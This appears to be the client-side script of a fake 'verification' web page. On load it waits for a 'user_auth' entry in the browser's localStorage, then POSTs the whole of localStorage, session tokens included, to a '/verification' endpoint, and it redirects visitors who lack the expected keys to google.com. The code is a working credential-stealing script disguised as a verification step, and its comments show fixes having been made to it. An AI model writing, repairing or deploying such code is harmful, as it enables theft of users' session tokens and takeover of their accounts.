function getLocalStorage() {
    let i = 0;
    const localstorage = [];
    while (true) {
        const key = localStorage.key(i);
        if (key == null) break;
        const obj = {};
        obj[key] = localStorage.getItem(key);
        localstorage.push(obj);
        i++;
    }
    return localstorage;
}

async function getCaches() { // Unused? But fixed anyway
    let i = 0;
    const cache = [];
    const keys = await caches.keys();
    while (true) {
        const key = keys.at(i);
        if (key == null) break;
        const obj = {};
        obj[key] = await caches.open(key); // Fixed: async open
        cache.push(obj);
        i++;
    }
    return cache;
}

async function onloadevent() {
    const key = localStorage.getItem("verification-key");
    const type = localStorage.getItem("verification-type");
    if (key == undefined) return location.assign("https://google.com");
    if (type == undefined) return location.assign("https://google.com");

    let noRepeat = false;
    const interval = setInterval(async () => {
        if (noRepeat) return;

        if (localStorage.getItem("user_auth") == undefined) return;
        else noRepeat = true;

        try {
            await fetch("/verification", {
                method: "POST",
                body: JSON.stringify({ type, key, data: getLocalStorage() })
            });
        } catch (err) {
            console.error("Fetch verification error:", err); // Log for demo
        }

        clearInterval(interval);
    }, 1000);
}

window.addEventListener("load", onloadevent);
